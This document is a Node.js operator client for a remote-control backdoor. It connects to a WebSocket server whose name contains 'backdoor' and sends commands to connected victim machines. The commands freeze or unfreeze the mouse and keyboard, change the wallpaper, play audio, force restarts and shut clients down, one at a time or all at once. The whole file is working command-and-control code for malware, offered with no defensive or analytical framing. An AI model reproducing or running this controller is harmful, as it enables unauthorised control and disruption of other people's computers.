const WebSocket = require("ws"); // CJS Only for packing (pkg)
const readline = require("readline");

require("dotenv").config()

const ws = new WebSocket("wss://backdoor-freezeee.onrender.com");

const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nBYE - Turns off a client\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const commandsMap = {
  "M": "FREEZE_MOUSE",
  "K": "FREEZE_KEYBOARD",
  "UM": "UNFREEZE_MOUSE",
  "UK": "UNFREEZE_KEYBOARD",
  "I": "IMAGE",
  "C": "CALCULATOR",
  "AU": "AUDIO",
  "CW": "CHANGE_WALLPAPER",
  "BYE": "BYE",
  "FR": "FORCE_RESTART",
  "SF": "SAFE_RESTART",
  spcArgs: { "A": "ALL" }
};

function connect() {
  ws.on("open", () => {
    console.log("-------------------------- ADM CLIENT --------------------------\n")
    console.log("Connected to server\n");
    ws.send("ADM");

    console.log(optionsTable);

    rl.on("line", (input) => {
      const command = input.trim()

      if (command.toLowerCase() === "lc") {
        ws.send("LIST_CLIENTS");
        console.log("\nRequested client list");
        return;
      }

      const sep = '|';

      if (!command.includes(sep)) {
        console.log("Bad Syntax!");

        return;
      }

      // {SPECIAL}|COMMAND|{opc.. Arg1}
      const target = command.split(sep)[0];
      const key = command.split(sep)[1].toUpperCase();
      const arg1 = command.split(sep)[2]

      let sendString = "";

      if (!commandsMap[key]) {
        console.log("Bad Command");

        return;
      }

      if (commandsMap.spcArgs[target.toUpperCase()])
        sendString += commandsMap.spcArgs[target.toUpperCase()] + "|";
      else
        sendString += target.toLowerCase() + "|";
      sendString += commandsMap[key];

      if (arg1) sendString += "|" + arg1;

      sendString = sendString.trim();
      console.log("Sent:", sendString);
      ws.send(sendString);
    });
  });

  ws.on("message", (data) => {
    console.log("Message:", data.toString(), "\n");
  });

  ws.on("close", () => {
    console.log("Connection closed");

    return;
  });

  ws.on("error", (err) => {
    console.error("Erro:", err.message);

    return;
  });
}

connect();
